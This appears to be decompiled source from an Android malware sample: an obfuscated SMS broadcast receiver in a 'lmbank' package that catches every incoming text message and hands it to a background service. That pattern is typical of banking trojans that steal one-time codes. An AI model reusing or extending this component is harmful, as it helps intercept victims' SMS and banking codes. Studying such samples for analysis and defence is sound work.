package com.wish.lmbank.sms.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.wish.lmbank.sms.service.SmsReceiverServiceV;

import gv00l3ah.mvdt7w.bb7d7pu7;


/**
 * 短信监听
 */
/* loaded from: cookie_9234504.jar:com/wish/lmbank/sms/receiver/LSmsReceiverV.class */
public class LSmsReceiverV extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        System.out.println("来短信了");
        intent.setClass(context, SmsReceiverServiceV.class);
//         intent.putExtra(bb7d7pu7.m5998("GwwaHAUd"), getResultCode());
        intent.putExtra("result", getResultCode());
        SmsReceiverServiceV.beginStartingService(context, intent);
    }
}
